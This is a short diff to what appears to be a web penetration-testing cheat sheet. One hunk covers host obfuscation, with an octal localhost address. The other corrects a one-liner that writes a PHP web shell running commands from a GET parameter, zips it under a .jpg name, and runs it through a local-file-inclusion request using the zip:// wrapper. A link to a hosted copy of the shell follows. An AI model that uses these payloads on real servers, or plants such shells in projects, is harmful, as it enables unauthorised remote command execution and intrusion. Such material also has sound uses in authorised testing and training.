@@ -25,6 +25,7 @@ https://github.com/0xInfection/Awesome-WAF
 ## Host Obfuscation
 
 <img height="400em" src="https://user-images.githubusercontent.com/54555784/188947375-6cb16b30-369c-4831-b783-47565623827b.png" />
+
 e.g. (127.0.0.1)  
 -> Octal  
 0177.0000.0000.0001  
@@ -734,7 +735,7 @@ https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/code
 -> Zip
 
 1- 
-`echo '\<?php system($_GET["cmd"]); ?>' > ok.php && zip wshell_zip.jpg ok.php`  
+`echo '<?php system($_GET["cmd"]); ?>' > ok.php && zip wshell_zip.jpg ok.php`  
 2- 
 `http://ip/index.php?file=zip://./uploads/wshell_zip.jpg%23ok.php&cmd=id`  
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/wshell_zip.jpg  
